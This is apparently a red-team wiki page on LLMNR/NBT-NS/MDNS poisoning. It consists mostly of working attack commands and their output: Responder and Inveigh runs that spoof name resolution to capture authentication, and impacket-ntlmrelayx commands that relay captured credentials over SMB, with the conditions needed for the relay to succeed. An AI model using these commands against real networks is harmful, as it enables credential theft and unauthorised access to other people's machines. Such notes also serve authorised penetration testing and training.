---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/adversary-in-the-middle/llmnr-nbt-ns-mdns-poisoning
---

# LLMNR/NBT-NS/MDNS Poisoning

By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.

## Linux

```bash
└─$ sudo responder -I eth0 -v 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
```

<figure><img src="../../../../.gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (911).png" alt=""><figcaption></figcaption></figure>

## Windows

```powershell
.\Inveigh.exe
[*] Inveigh 2.0 [Started 2021-06-15T00:08:37 | PID 12588]
[+] Packet Sniffer Addresses [IP 10.10.2.111 | IPv6 fe80::3d3b:b73c:c43e:ed4e%2]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 10.10.2.111 | IPv6 fe80::3d3b:b73c:c43e:ed4e%2]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[-] DHCPv6
[+] DNS Packet Sniffer [Type A]
[-] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[-] MDNS
[-] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[-] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[-] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Users\dev\source\repos\Inveigh\Inveigh\bin\Debug\net35]
[+] Previous Session Files [Imported]
[*] Press ESC to enter/exit interactive console
```

## SMB Relay

It's required SMB Signing must be disable and user credential relayed must be admin on machine

```python
└─$ impacket-ntlmrelayx -smb2support -t 10.10.10.11
└─$ impacket-ntlmrelayx -smb2support -tf targets.txt
```

On Responder we must reconfigure to disable SMB off

```
/etc/responder/Responder.conf
```

<figure><img src="../../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>
